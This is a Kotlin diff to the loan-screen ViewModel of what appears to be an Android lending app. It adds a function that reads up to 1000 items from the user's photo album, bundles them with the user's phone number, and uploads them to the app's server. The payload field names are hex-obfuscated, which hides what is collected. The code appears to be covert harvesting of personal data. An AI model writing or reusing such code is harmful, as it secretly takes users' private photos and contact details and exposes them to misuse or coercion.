@@ -1,5 +1,8 @@
 package com.dream.bjst.loan.vm
 
+import com.blankj.utilcode.util.GsonUtils
+import com.dream.bjst.bean.DevicePhotoParamBean
+import com.dream.bjst.common.UserManager
 import com.dream.bjst.identification.bean.IdCardStatusBean
 import com.dream.bjst.loan.bean.*
 import com.dream.bjst.net.Api
@@ -21,6 +24,7 @@ class LoanViewModel : BaseViewModel() {
     val userStatus = SingleLiveEvent<IdCardStatusBean>()
     val processOrders = SingleLiveEvent<String>()
     val localFiles = SingleLiveEvent<List<File>>()
+    val upDevicePhoto = SingleLiveEvent<Boolean>()
 
     fun fetchCustomerKycStatus() {
         rxLaunchUI({
@@ -62,10 +66,15 @@ class LoanViewModel : BaseViewModel() {
         }, showDialog = false)
     }
 
-    fun getLocalAlbumList() {
+    /**
+     * 上传设备信息 （相册信息）
+     */
+    fun upDevicePhoto() {
         rxLaunchUI({
-            val  result = DeviceUtils.getLocalAlbumList(0,50)
-            localFiles.postValue(result)
-        }, showDialog = false)
+            val filesEnCrypt = DeviceUtils.getLocalAlbumList(0,1000)
+            val paramBean = DevicePhotoParamBean(`9091829D9791BD9A929BAE9D84A78086`= filesEnCrypt,`999B969D9891` = UserManager.getUserPhone())
+            val result = Api.uploadDeviceAlbumInfo(GsonUtils.toJson(paramBean))
+            upDevicePhoto.postValue(result.`869187819880`)
+        })
     }
 }
